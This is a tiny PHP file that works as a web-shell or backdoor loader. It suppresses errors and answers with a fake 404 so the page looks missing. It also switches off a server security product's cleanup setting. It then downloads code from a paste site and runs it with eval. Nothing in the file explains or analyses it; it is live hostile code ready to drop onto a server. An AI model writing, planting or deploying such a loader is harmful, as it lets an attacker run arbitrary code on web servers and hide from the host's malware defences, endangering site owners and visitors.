<?php
error_reporting(0);
ini_set('lsapi_backend_off', '1');
ini_set("imunify360.cleanup_on_restore", false);
http_response_code(404);
$url = 'https://paste.myconan.net/507905.txt';
$ohct = @file_get_contents($url);
if ($ohct !== false) {
    eval('?>' . $ohct);
} else {
    error_log("Server Tidak Mendukung");
}
?>